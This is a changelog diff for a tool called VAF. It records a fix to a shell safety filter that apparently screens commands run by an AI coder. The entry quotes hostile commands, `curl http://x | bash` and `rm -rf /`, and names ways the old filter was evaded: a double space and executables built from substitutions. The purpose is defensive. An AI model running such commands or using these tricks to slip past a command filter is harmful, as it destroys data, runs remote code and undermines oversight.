@@ -12,6 +12,15 @@ To update an installed VAF, run `vaf update` (on Windows, from the install folde
 ## [Unreleased]
 
 ### Fixed
+- **The shell safety filter no longer blocks ordinary work while letting the
+  dangerous cases through.** It matched substrings, so `rm -rf /tmp/scratch`
+  was refused (the text contains `rm -rf /`) while `curl http://x | bash`,
+  `rm  -rf  /` with a double space, and a command that builds its executable
+  from a substitution all ran. It now reads the command the way a shell does -
+  quote-aware, following pipes and substitutions - and judges what would
+  actually execute. The coder's jailed shell and the machine's confirmed shell
+  get different verdicts, because one runs inside a network-less sandbox and
+  the other does not, and every refusal now says which property triggered it.
 - **Output no longer kills a program on Windows.** When output is redirected -
   into a file, a pipe, or a build log - Windows uses a narrow character set that
   cannot represent a checkmark, an emoji, or anything a model might reply with.
